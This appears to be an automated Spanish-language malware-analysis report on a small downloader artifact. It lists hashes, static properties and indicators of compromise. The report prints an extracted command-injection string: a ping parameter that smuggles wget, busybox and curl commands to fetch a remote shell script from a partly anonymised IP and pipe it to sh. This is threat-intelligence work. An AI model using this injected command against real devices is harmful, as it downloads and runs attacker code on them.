# 🧬 Payload Analysis

`53a299f1cce05b57bb6310487485ca4ff1ea5c580f0d97f70cdaf28914640504`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 218 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `53a299f1cce05b57bb6310487485ca4ff1ea5c580f0d97f70cdaf28914640504`
- **SHA1:** `07732bc48e1544fc319f6ea247b971fb5dbcc8ab`
- **MD5:** `03539367b21f4230141b89beb3cc6f24`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 218 B |
| Entropía | 4.74 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
act=ping&dst=%26%20cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bbusybox%20wget%20http://91.9
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ddiag%26 | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | act=ping&dst=%26%20cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bbusybox%20wget%20http://91.9 | strings |
| hash | 53a299f1cce05b57bb6310487485ca4ff1ea5c580f0d97f70cdaf28914640504 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
